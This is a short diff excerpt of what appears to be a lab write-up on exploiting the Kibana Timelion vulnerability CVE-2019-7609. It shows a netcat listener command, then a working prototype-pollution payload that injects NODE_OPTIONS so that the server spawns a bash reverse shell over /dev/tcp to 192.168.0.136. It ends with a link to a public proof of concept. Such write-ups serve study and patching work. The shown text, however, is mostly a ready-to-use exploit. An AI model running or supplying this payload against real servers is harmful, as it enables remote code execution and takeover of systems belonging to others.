@@ -34,10 +34,12 @@ On a shell, i run a listenner to get the reverseshell.
 `nc -lnvp 4444`
 
 On the Timelion, i can put the payload :
+
 `
 .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
 `
+
 Then run the code and load the canvas page.
 
 Or we can use this [PoC](https://github.com/LandGrey/CVE-2019-7609)
